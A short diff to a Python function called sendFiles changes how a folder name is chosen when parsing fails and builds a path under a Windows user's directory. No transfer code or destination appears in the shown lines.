@@ -49,7 +49,8 @@ def sendFiles(filedir: str):
         filedir = filedir.split('-')[2]
         print(f"Got {filedir}")
     except:
-        filedir = "Documents"
+        pass
+        #filedir = "Documents"
 
     full_path =  "C:\\Users\\" + getuser()[0] + "\\" + filedir
     print(full_path)
